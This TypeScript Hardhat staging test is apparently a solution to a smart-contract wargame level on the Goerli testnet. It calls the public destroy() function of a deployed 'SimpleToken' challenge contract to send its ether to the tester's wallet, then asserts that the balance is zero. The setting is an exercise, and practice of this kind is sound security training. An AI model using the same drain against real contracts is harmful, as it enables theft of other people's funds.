import { assert } from "chai"
import { network, ethers } from "hardhat"
import { developmentChains, networkConfig } from "../../helper-hardhat-config"
import { SimpleToken, Hack } from "../../typechain-types"
import abi from "../../artifacts/contracts/Recovery.sol/SimpleToken.json"

const GOERLI_RPC_URL = process.env.GOERLI_RPC_URL
const PRIVATE_KEY = String(process.env.PRIVATE_KEY) 

developmentChains.includes(network.name)
    ? describe.skip
    : describe("SimpleToken hack staging", function () {
        let provider: any 
        let contractAddress: string
        let simpleToken:SimpleToken
        let simpleTokenContract: SimpleToken
        let wallet:any
        let hack: Hack
        

        beforeEach(async() => {
            provider =  new ethers.providers.JsonRpcProvider(GOERLI_RPC_URL);
            wallet  = new ethers.Wallet(PRIVATE_KEY,provider)
            

            contractAddress = networkConfig[network.config.chainId!]["contractAddress"]!
            simpleTokenContract = new ethers.Contract(contractAddress,abi.abi,provider) 
            simpleToken = simpleTokenContract.connect(wallet)           
        })
        describe("Try hack simpleToken", function () {
            it("Check the balance is greater > 0", async() => {
                const balance:string = (await ethers.provider.getBalance(contractAddress)).toString()
                assert.notEqual(balance,"0")
            })
            it("Get the money", async() => {
                const tx = await simpleToken.destroy(wallet.address)
                await tx.wait(1)
                const balance:string = (await ethers.provider.getBalance(contractAddress)).toString()
                assert.equal(balance,"0")
            })
        })
        
    })